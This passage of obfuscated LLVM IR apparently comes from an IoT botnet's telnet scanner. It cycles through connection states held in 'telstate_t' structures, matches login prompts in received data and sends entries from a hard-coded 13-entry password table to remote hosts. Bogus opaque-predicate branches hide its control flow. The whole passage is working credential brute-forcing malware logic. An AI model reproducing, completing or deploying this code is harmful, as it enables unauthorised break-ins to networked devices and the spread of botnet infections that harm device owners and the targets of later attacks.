  %1274 = load i32, i32* %2, align 4
  %1275 = sext i32 %1274 to i64
  %1276 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %1275
  %1277 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1276, i32 0, i32 7
  store i16 0, i16* %1277, align 16
  %1278 = load i32, i32* %2, align 4
  %1279 = sext i32 %1278 to i64
  %1280 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %1279
  %1281 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1280, i32 0, i32 8
  %1282 = load i8*, i8** %1281, align 8
  %1283 = call i8* @strstr(i8* %1282, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.61, i32 0, i32 0)) #10
  %1284 = icmp ne i8* %1283, null
  br i1 %1284, label %1285, label %1306

; <label>:1285:                                   ; preds = %1269
  %1286 = load i32, i32* @x.69
  %1287 = load i32, i32* @y.70
  %1288 = sub i32 %1286, 1
  %1289 = mul i32 %1286, %1288
  %1290 = urem i32 %1289, 2
  %1291 = icmp eq i32 %1290, 0
  %1292 = icmp slt i32 %1287, 10
  %1293 = or i1 %1291, %1292
  br i1 %1293, label %originalBB179, label %originalBB179alteredBB

originalBB179:                                    ; preds = %originalBB179alteredBB, %1285
  %1294 = load i32, i32* %2, align 4
  %1295 = sext i32 %1294 to i64
  %1296 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %1295
  %1297 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1296, i32 0, i32 2
  store i8 5, i8* %1297, align 8
  %1298 = load i32, i32* @x.69
  %1299 = load i32, i32* @y.70
  %1300 = sub i32 %1298, 1
  %1301 = mul i32 %1298, %1300
  %1302 = urem i32 %1301, 2
  %1303 = icmp eq i32 %1302, 0
  %1304 = icmp slt i32 %1299, 10
  %1305 = or i1 %1303, %1304
  br i1 %1305, label %originalBBpart2181, label %originalBB179alteredBB

originalBBpart2181:                               ; preds = %originalBB179
  br label %1311

; <label>:1306:                                   ; preds = %1269
  %1307 = load i32, i32* %2, align 4
  %1308 = sext i32 %1307 to i64
  %1309 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %1308
  %1310 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1309, i32 0, i32 2
  store i8 7, i8* %1310, align 8
  br label %1311

; <label>:1311:                                   ; preds = %1306, %originalBBpart2181
  %1312 = load i32, i32* %2, align 4
  %1313 = sext i32 %1312 to i64
  %1314 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %1313
  %1315 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1314, i32 0, i32 8
  %1316 = load i8*, i8** %1315, align 8
  call void @llvm.memset.p0i8.i64(i8* %1316, i8 0, i64 1024, i32 1, i1 false)
  br label %3224

; <label>:1317:                                   ; preds = %1250
  %1318 = load i32, i32* @x.69
  %1319 = load i32, i32* @y.70
  %1320 = sub i32 %1318, 1
  %1321 = mul i32 %1318, %1320
  %1322 = urem i32 %1321, 2
  %1323 = icmp eq i32 %1322, 0
  %1324 = icmp slt i32 %1319, 10
  %1325 = or i1 %1323, %1324
  br i1 %1325, label %originalBB183, label %originalBB183alteredBB

originalBB183:                                    ; preds = %originalBB183alteredBB, %1317
  %1326 = load i32, i32* %2, align 4
  %1327 = sext i32 %1326 to i64
  %1328 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %1327
  %1329 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1328, i32 0, i32 8
  %1330 = load i8*, i8** %1329, align 8
  %1331 = call i8* @strstr(i8* %1330, i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.63, i32 0, i32 0)) #10
  %1332 = icmp ne i8* %1331, null
  %1333 = load i32, i32* @x.69
  %1334 = load i32, i32* @y.70
  %1335 = sub i32 %1333, 1
  %1336 = mul i32 %1333, %1335
  %1337 = urem i32 %1336, 2
  %1338 = icmp eq i32 %1337, 0
  %1339 = icmp slt i32 %1334, 10
  %1340 = or i1 %1338, %1339
  br i1 %1340, label %originalBBpart2185, label %originalBB183alteredBB

originalBBpart2185:                               ; preds = %originalBB183
  br i1 %1332, label %1341, label %1356

; <label>:1341:                                   ; preds = %originalBBpart2185
  %1342 = load i32, i32* %2, align 4
  %1343 = sext i32 %1342 to i64
  %1344 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %1343
  %1345 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1344, i32 0, i32 0
  %1346 = load i32, i32* %1345, align 16
  %1347 = call i32 @sclose(i32 %1346)
  %1348 = load i32, i32* %2, align 4
  %1349 = sext i32 %1348 to i64
  %1350 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %1349
  %1351 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1350, i32 0, i32 2
  store i8 0, i8* %1351, align 8
  %1352 = load i32, i32* %2, align 4
  %1353 = sext i32 %1352 to i64
  %1354 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %1353
  %1355 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1354, i32 0, i32 3
  store i8 0, i8* %1355, align 1
  br label %3224

; <label>:1356:                                   ; preds = %originalBBpart2185
  %1357 = load i32, i32* %2, align 4
  %1358 = sext i32 %1357 to i64
  %1359 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %1358
  %1360 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1359, i32 0, i32 8
  %1361 = load i8*, i8** %1360, align 8
  %1362 = call i8* @strstr(i8* %1361, i8* getelementptr inbounds ([10 x i8], [10 x i8]* @.str.64, i32 0, i32 0)) #10
  %1363 = icmp ne i8* %1362, null
  br i1 %1363, label %1364, label %1379

; <label>:1364:                                   ; preds = %1356
  %1365 = load i32, i32* %2, align 4
  %1366 = sext i32 %1365 to i64
  %1367 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %1366
  %1368 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1367, i32 0, i32 0
  %1369 = load i32, i32* %1368, align 16
  %1370 = call i32 @sclose(i32 %1369)
  %1371 = load i32, i32* %2, align 4
  %1372 = sext i32 %1371 to i64
  %1373 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %1372
  %1374 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1373, i32 0, i32 2
  store i8 0, i8* %1374, align 8
  %1375 = load i32, i32* %2, align 4
  %1376 = sext i32 %1375 to i64
  %1377 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %1376
  %1378 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1377, i32 0, i32 3
  store i8 0, i8* %1378, align 1
  br label %3224

; <label>:1379:                                   ; preds = %1356
  %1380 = load i32, i32* %2, align 4
  %1381 = sext i32 %1380 to i64
  %1382 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %1381
  %1383 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1382, i32 0, i32 8
  %1384 = load i8*, i8** %1383, align 8
  %1385 = call i8* @strstr(i8* %1384, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.65, i32 0, i32 0)) #10
  %1386 = icmp ne i8* %1385, null
  br i1 %1386, label %1387, label %1418

; <label>:1387:                                   ; preds = %1379
  %1388 = load i32, i32* @x.69
  %1389 = load i32, i32* @y.70
  %1390 = sub i32 %1388, 1
  %1391 = mul i32 %1388, %1390
  %1392 = urem i32 %1391, 2
  %1393 = icmp eq i32 %1392, 0
  %1394 = icmp slt i32 %1389, 10
  %1395 = or i1 %1393, %1394
  br i1 %1395, label %originalBB187, label %originalBB187alteredBB

originalBB187:                                    ; preds = %originalBB187alteredBB, %1387
  %1396 = load i32, i32* %2, align 4
  %1397 = sext i32 %1396 to i64
  %1398 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %1397
  %1399 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1398, i32 0, i32 0
  %1400 = load i32, i32* %1399, align 16
  %1401 = call i32 @sclose(i32 %1400)
  %1402 = load i32, i32* %2, align 4
  %1403 = sext i32 %1402 to i64
  %1404 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %1403
  %1405 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1404, i32 0, i32 2
  store i8 0, i8* %1405, align 8
  %1406 = load i32, i32* %2, align 4
  %1407 = sext i32 %1406 to i64
  %1408 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %1407
  %1409 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1408, i32 0, i32 3
  store i8 0, i8* %1409, align 1
  %1410 = load i32, i32* @x.69
  %1411 = load i32, i32* @y.70
  %1412 = sub i32 %1410, 1
  %1413 = mul i32 %1410, %1412
  %1414 = urem i32 %1413, 2
  %1415 = icmp eq i32 %1414, 0
  %1416 = icmp slt i32 %1411, 10
  %1417 = or i1 %1415, %1416
  br i1 %1417, label %originalBBpart2189, label %originalBB187alteredBB

originalBBpart2189:                               ; preds = %originalBB187
  br label %3224

; <label>:1418:                                   ; preds = %1379
  %1419 = load i32, i32* %2, align 4
  %1420 = sext i32 %1419 to i64
  %1421 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %1420
  %1422 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1421, i32 0, i32 8
  %1423 = load i8*, i8** %1422, align 8
  %1424 = call i8* @strstr(i8* %1423, i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.66, i32 0, i32 0)) #10
  %1425 = icmp ne i8* %1424, null
  br i1 %1425, label %1426, label %1457

; <label>:1426:                                   ; preds = %1418
  %1427 = load i32, i32* @x.69
  %1428 = load i32, i32* @y.70
  %1429 = sub i32 %1427, 1
  %1430 = mul i32 %1427, %1429
  %1431 = urem i32 %1430, 2
  %1432 = icmp eq i32 %1431, 0
  %1433 = icmp slt i32 %1428, 10
  %1434 = or i1 %1432, %1433
  br i1 %1434, label %originalBB191, label %originalBB191alteredBB

originalBB191:                                    ; preds = %originalBB191alteredBB, %1426
  %1435 = load i32, i32* %2, align 4
  %1436 = sext i32 %1435 to i64
  %1437 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %1436
  %1438 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1437, i32 0, i32 0
  %1439 = load i32, i32* %1438, align 16
  %1440 = call i32 @sclose(i32 %1439)
  %1441 = load i32, i32* %2, align 4
  %1442 = sext i32 %1441 to i64
  %1443 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %1442
  %1444 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1443, i32 0, i32 2
  store i8 0, i8* %1444, align 8
  %1445 = load i32, i32* %2, align 4
  %1446 = sext i32 %1445 to i64
  %1447 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %1446
  %1448 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1447, i32 0, i32 3
  store i8 0, i8* %1448, align 1
  %1449 = load i32, i32* @x.69
  %1450 = load i32, i32* @y.70
  %1451 = sub i32 %1449, 1
  %1452 = mul i32 %1449, %1451
  %1453 = urem i32 %1452, 2
  %1454 = icmp eq i32 %1453, 0
  %1455 = icmp slt i32 %1450, 10
  %1456 = or i1 %1454, %1455
  br i1 %1456, label %originalBBpart2193, label %originalBB191alteredBB

originalBBpart2193:                               ; preds = %originalBB191
  br label %3224

; <label>:1457:                                   ; preds = %1418
  %1458 = load i32, i32* @x.69
  %1459 = load i32, i32* @y.70
  %1460 = sub i32 %1458, 1
  %1461 = mul i32 %1458, %1460
  %1462 = urem i32 %1461, 2
  %1463 = icmp eq i32 %1462, 0
  %1464 = icmp slt i32 %1459, 10
  %1465 = or i1 %1463, %1464
  br i1 %1465, label %originalBB195, label %originalBB195alteredBB

originalBB195:                                    ; preds = %originalBB195alteredBB, %1457
  %1466 = load i32, i32* %2, align 4
  %1467 = sext i32 %1466 to i64
  %1468 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %1467
  %1469 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1468, i32 0, i32 8
  %1470 = load i8*, i8** %1469, align 8
  %1471 = call i8* @strstr(i8* %1470, i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.67, i32 0, i32 0)) #10
  %1472 = icmp ne i8* %1471, null
  %1473 = load i32, i32* @x.69
  %1474 = load i32, i32* @y.70
  %1475 = sub i32 %1473, 1
  %1476 = mul i32 %1473, %1475
  %1477 = urem i32 %1476, 2
  %1478 = icmp eq i32 %1477, 0
  %1479 = icmp slt i32 %1474, 10
  %1480 = or i1 %1478, %1479
  br i1 %1480, label %originalBBpart2197, label %originalBB195alteredBB

originalBBpart2197:                               ; preds = %originalBB195
  br i1 %1472, label %1481, label %1496

; <label>:1481:                                   ; preds = %originalBBpart2197
  %1482 = load i32, i32* %2, align 4
  %1483 = sext i32 %1482 to i64
  %1484 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %1483
  %1485 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1484, i32 0, i32 0
  %1486 = load i32, i32* %1485, align 16
  %1487 = call i32 @sclose(i32 %1486)
  %1488 = load i32, i32* %2, align 4
  %1489 = sext i32 %1488 to i64
  %1490 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %1489
  %1491 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1490, i32 0, i32 2
  store i8 0, i8* %1491, align 8
  %1492 = load i32, i32* %2, align 4
  %1493 = sext i32 %1492 to i64
  %1494 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %1493
  %1495 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1494, i32 0, i32 3
  store i8 0, i8* %1495, align 1
  br label %3224

; <label>:1496:                                   ; preds = %originalBBpart2197
  %1497 = load i32, i32* %2, align 4
  %1498 = sext i32 %1497 to i64
  %1499 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %1498
  %1500 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1499, i32 0, i32 8
  %1501 = load i8*, i8** %1500, align 8
  %1502 = call i8* @strstr(i8* %1501, i8* getelementptr inbounds ([13 x i8], [13 x i8]* @.str.68, i32 0, i32 0)) #10
  %1503 = icmp ne i8* %1502, null
  br i1 %1503, label %1504, label %1519

; <label>:1504:                                   ; preds = %1496
  %1505 = load i32, i32* %2, align 4
  %1506 = sext i32 %1505 to i64
  %1507 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %1506
  %1508 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1507, i32 0, i32 0
  %1509 = load i32, i32* %1508, align 16
  %1510 = call i32 @sclose(i32 %1509)
  %1511 = load i32, i32* %2, align 4
  %1512 = sext i32 %1511 to i64
  %1513 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %1512
  %1514 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1513, i32 0, i32 2
  store i8 0, i8* %1514, align 8
  %1515 = load i32, i32* %2, align 4
  %1516 = sext i32 %1515 to i64
  %1517 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %1516
  %1518 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1517, i32 0, i32 3
  store i8 0, i8* %1518, align 1
  br label %3224

; <label>:1519:                                   ; preds = %1496
  %1520 = load i32, i32* %2, align 4
  %1521 = sext i32 %1520 to i64
  %1522 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %1521
  %1523 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1522, i32 0, i32 8
  %1524 = load i8*, i8** %1523, align 8
  %1525 = call i8* @strstr(i8* %1524, i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.69, i32 0, i32 0)) #10
  %1526 = icmp ne i8* %1525, null
  br i1 %1526, label %1527, label %1542

; <label>:1527:                                   ; preds = %1519
  %1528 = load i32, i32* %2, align 4
  %1529 = sext i32 %1528 to i64
  %1530 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %1529
  %1531 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1530, i32 0, i32 0
  %1532 = load i32, i32* %1531, align 16
  %1533 = call i32 @sclose(i32 %1532)
  %1534 = load i32, i32* %2, align 4
  %1535 = sext i32 %1534 to i64
  %1536 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %1535
  %1537 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1536, i32 0, i32 2
  store i8 0, i8* %1537, align 8
  %1538 = load i32, i32* %2, align 4
  %1539 = sext i32 %1538 to i64
  %1540 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %1539
  %1541 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1540, i32 0, i32 3
  store i8 0, i8* %1541, align 1
  br label %3224

; <label>:1542:                                   ; preds = %1519
  %1543 = load i32, i32* %2, align 4
  %1544 = sext i32 %1543 to i64
  %1545 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %1544
  %1546 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1545, i32 0, i32 8
  %1547 = load i8*, i8** %1546, align 8
  %1548 = call i8* @strstr(i8* %1547, i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.70, i32 0, i32 0)) #10
  %1549 = icmp ne i8* %1548, null
  br i1 %1549, label %1550, label %1565

; <label>:1550:                                   ; preds = %1542
  %1551 = load i32, i32* %2, align 4
  %1552 = sext i32 %1551 to i64
  %1553 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %1552
  %1554 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1553, i32 0, i32 0
  %1555 = load i32, i32* %1554, align 16
  %1556 = call i32 @sclose(i32 %1555)
  %1557 = load i32, i32* %2, align 4
  %1558 = sext i32 %1557 to i64
  %1559 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %1558
  %1560 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1559, i32 0, i32 2
  store i8 0, i8* %1560, align 8
  %1561 = load i32, i32* %2, align 4
  %1562 = sext i32 %1561 to i64
  %1563 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %1562
  %1564 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1563, i32 0, i32 3
  store i8 0, i8* %1564, align 1
  br label %3224

; <label>:1565:                                   ; preds = %1542
  %1566 = load i32, i32* %2, align 4
  %1567 = sext i32 %1566 to i64
  %1568 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %1567
  %1569 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1568, i32 0, i32 8
  %1570 = load i8*, i8** %1569, align 8
  %1571 = call i8* @strstr(i8* %1570, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.71, i32 0, i32 0)) #10
  %1572 = icmp ne i8* %1571, null
  br i1 %1572, label %1573, label %1588

; <label>:1573:                                   ; preds = %1565
  %1574 = load i32, i32* %2, align 4
  %1575 = sext i32 %1574 to i64
  %1576 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %1575
  %1577 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1576, i32 0, i32 0
  %1578 = load i32, i32* %1577, align 16
  %1579 = call i32 @sclose(i32 %1578)
  %1580 = load i32, i32* %2, align 4
  %1581 = sext i32 %1580 to i64
  %1582 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %1581
  %1583 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1582, i32 0, i32 2
  store i8 0, i8* %1583, align 8
  %1584 = load i32, i32* %2, align 4
  %1585 = sext i32 %1584 to i64
  %1586 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %1585
  %1587 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1586, i32 0, i32 3
  store i8 0, i8* %1587, align 1
  br label %3224

; <label>:1588:                                   ; preds = %1565
  %1589 = load i32, i32* %2, align 4
  %1590 = sext i32 %1589 to i64
  %1591 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %1590
  %1592 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1591, i32 0, i32 8
  %1593 = load i8*, i8** %1592, align 8
  %1594 = call i64 @strlen(i8* %1593) #10
  %1595 = trunc i64 %1594 to i16
  %1596 = load i32, i32* %2, align 4
  %1597 = sext i32 %1596 to i64
  %1598 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %1597
  %1599 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1598, i32 0, i32 7
  store i16 %1595, i16* %1599, align 16
  br label %1600

; <label>:1600:                                   ; preds = %1588
  %1601 = load i32, i32* %2, align 4
  %1602 = sext i32 %1601 to i64
  %1603 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %1602
  %1604 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1603, i32 0, i32 6
  %1605 = load i32, i32* %1604, align 4
  %1606 = add i32 %1605, 10
  %1607 = zext i32 %1606 to i64
  %1608 = call i64 @time(i64* null) #2
  %1609 = icmp slt i64 %1607, %1608
  br i1 %1609, label %1610, label %1625

; <label>:1610:                                   ; preds = %1600
  %1611 = load i32, i32* %2, align 4
  %1612 = sext i32 %1611 to i64
  %1613 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %1612
  %1614 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1613, i32 0, i32 0
  %1615 = load i32, i32* %1614, align 16
  %1616 = call i32 @sclose(i32 %1615)
  %1617 = load i32, i32* %2, align 4
  %1618 = sext i32 %1617 to i64
  %1619 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %1618
  %1620 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1619, i32 0, i32 2
  store i8 0, i8* %1620, align 8
  %1621 = load i32, i32* %2, align 4
  %1622 = sext i32 %1621 to i64
  %1623 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %1622
  %1624 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1623, i32 0, i32 3
  store i8 1, i8* %1624, align 1
  br label %1625

; <label>:1625:                                   ; preds = %1610, %1600
  br label %3223

; <label>:1626:                                   ; preds = %84
  %1627 = load i32, i32* @x.69
  %1628 = load i32, i32* @y.70
  %1629 = sub i32 %1627, 1
  %1630 = mul i32 %1627, %1629
  %1631 = urem i32 %1630, 2
  %1632 = icmp eq i32 %1631, 0
  %1633 = icmp slt i32 %1628, 10
  %1634 = or i1 %1632, %1633
  br i1 %1634, label %originalBB199, label %originalBB199alteredBB

originalBB199:                                    ; preds = %originalBB199alteredBB, %1626
  %1635 = load i32, i32* %2, align 4
  %1636 = sext i32 %1635 to i64
  %1637 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %1636
  %1638 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1637, i32 0, i32 0
  %1639 = load i32, i32* %1638, align 16
  %1640 = load i32, i32* %2, align 4
  %1641 = sext i32 %1640 to i64
  %1642 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %1641
  %1643 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1642, i32 0, i32 5
  %1644 = load i8, i8* %1643, align 1
  %1645 = zext i8 %1644 to i64
  %1646 = getelementptr inbounds [13 x i8*], [13 x i8*]* @passwords, i64 0, i64 %1645
  %1647 = load i8*, i8** %1646, align 8
  %1648 = load i32, i32* %2, align 4
  %1649 = sext i32 %1648 to i64
  %1650 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %1649
  %1651 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1650, i32 0, i32 5
  %1652 = load i8, i8* %1651, align 1
  %1653 = zext i8 %1652 to i64
  %1654 = getelementptr inbounds [13 x i8*], [13 x i8*]* @passwords, i64 0, i64 %1653
  %1655 = load i8*, i8** %1654, align 8
  %1656 = call i64 @strlen(i8* %1655) #10
  %1657 = call i64 @send(i32 %1639, i8* %1647, i64 %1656, i32 16384)
  %1658 = icmp slt i64 %1657, 0
  %1659 = load i32, i32* @x.69
  %1660 = load i32, i32* @y.70
  %1661 = sub i32 %1659, 1
  %1662 = mul i32 %1659, %1661
  %1663 = urem i32 %1662, 2
  %1664 = icmp eq i32 %1663, 0
  %1665 = icmp slt i32 %1660, 10
  %1666 = or i1 %1664, %1665
  br i1 %1666, label %originalBBpart2201, label %originalBB199alteredBB

originalBBpart2201:                               ; preds = %originalBB199
  br i1 %1658, label %1667, label %1682

; <label>:1667:                                   ; preds = %originalBBpart2201
  %1668 = load i32, i32* %2, align 4
  %1669 = sext i32 %1668 to i64
  %1670 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %1669
  %1671 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1670, i32 0, i32 0
  %1672 = load i32, i32* %1671, align 16
  %1673 = call i32 @sclose(i32 %1672)
  %1674 = load i32, i32* %2, align 4
  %1675 = sext i32 %1674 to i64
  %1676 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %1675
  %1677 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1676, i32 0, i32 2
  store i8 0, i8* %1677, align 8
  %1678 = load i32, i32* %2, align 4
  %1679 = sext i32 %1678 to i64
  %1680 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %1679
  %1681 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1680, i32 0, i32 3
  store i8 1, i8* %1681, align 1
  br label %3224

; <label>:1682:                                   ; preds = %originalBBpart2201
  %1683 = load i32, i32* %2, align 4
  %1684 = sext i32 %1683 to i64
  %1685 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %1684
  %1686 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1685, i32 0, i32 0
  %1687 = load i32, i32* %1686, align 16
  %1688 = call i64 @send(i32 %1687, i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.62, i32 0, i32 0), i64 2, i32 16384)
  %1689 = icmp slt i64 %1688, 0
  br i1 %1689, label %1690, label %1705

; <label>:1690:                                   ; preds = %1682
  %1691 = load i32, i32* %2, align 4
  %1692 = sext i32 %1691 to i64
  %1693 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %1692
  %1694 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1693, i32 0, i32 0
  %1695 = load i32, i32* %1694, align 16
  %1696 = call i32 @sclose(i32 %1695)
  %1697 = load i32, i32* %2, align 4
  %1698 = sext i32 %1697 to i64
  %1699 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %1698
  %1700 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1699, i32 0, i32 2
  store i8 0, i8* %1700, align 8
  %1701 = load i32, i32* %2, align 4
  %1702 = sext i32 %1701 to i64
  %1703 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %1702
  %1704 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1703, i32 0, i32 3
  store i8 1, i8* %1704, align 1
  br label %3224

; <label>:1705:                                   ; preds = %1682
  %1706 = load i32, i32* %2, align 4
  %1707 = sext i32 %1706 to i64
  %1708 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %1707
  %1709 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1708, i32 0, i32 2
  store i8 6, i8* %1709, align 8
  br label %3223

; <label>:1710:                                   ; preds = %84
  %1711 = load i32, i32* %2, align 4
  %1712 = sext i32 %1711 to i64
  %1713 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %1712
  %1714 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1713, i32 0, i32 6
  %1715 = load i32, i32* %1714, align 4
  %1716 = icmp eq i32 %1715, 0
  br i1 %1716, label %1717, label %1724

; <label>:1717:                                   ; preds = %1710
  %1718 = call i64 @time(i64* null) #2
  %1719 = trunc i64 %1718 to i32
  %1720 = load i32, i32* %2, align 4
  %1721 = sext i32 %1720 to i64
  %1722 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %1721
  %1723 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1722, i32 0, i32 6
  store i32 %1719, i32* %1723, align 4
  br label %1724

; <label>:1724:                                   ; preds = %1717, %1710
  %1725 = load i32, i32* @x.69
  %1726 = load i32, i32* @y.70
  %1727 = sub i32 %1725, 1
  %1728 = mul i32 %1725, %1727
  %1729 = urem i32 %1728, 2
  %1730 = icmp eq i32 %1729, 0
  %1731 = icmp slt i32 %1726, 10
  %1732 = or i1 %1730, %1731
  br i1 %1732, label %originalBB203, label %originalBB203alteredBB

originalBB203:                                    ; preds = %originalBB203alteredBB, %1724
  %1733 = load i32, i32* %2, align 4
  %1734 = sext i32 %1733 to i64
  %1735 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %1734
  %1736 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1735, i32 0, i32 0
  %1737 = load i32, i32* %1736, align 16
  %1738 = load i32, i32* %2, align 4
  %1739 = sext i32 %1738 to i64
